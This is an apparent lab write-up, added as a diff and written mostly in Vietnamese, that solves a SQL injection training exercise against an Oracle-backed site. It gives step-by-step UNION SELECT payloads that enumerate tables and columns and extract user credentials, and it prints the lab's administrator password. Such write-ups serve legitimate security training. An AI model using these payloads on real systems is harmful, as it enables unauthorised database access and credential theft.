@@ -1,0 +1,18 @@
+SQL injection - SQL injection attack, listing the database contents on Oracle
+
+End Goal:  log in as the administrator user.
+
+Analysis
+--------
+
+Bước 1: thêm ' vào cuối liên kết để quan sát phản hồi 
+--> có phản hồi khác --> có thể thay đổi truy vấn 
+Bước 2: thêm -- vào sau --> có hiển thị ra 
+Bước 3: kiểm tra số cột trả về bằng order by --> có 2 cột trả về
+Bước 4: Sử dụng ' UNION SELECT NULL,table_name FROM all_tables-- để liệt kê các bảng có trong csdl
+có 2 bảng khả nghi: USERS_RCTKZA và APP_USERS_AND_ROLES
+Bước 5: sử dụng ' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_RCTKZA'--
+--> có được 2 cột: PASSWORD_TNOFNW và USERNAME_IPQAVF
+Bước 6: sử dụng ' UNION SELECT USERNAME_IPQAVF,PASSWORD_TNOFNW FROM USERS_RCTKZA--
+--> được tài khoản của admin: administrator
+redl3iu3wk3yuhy9s0bv
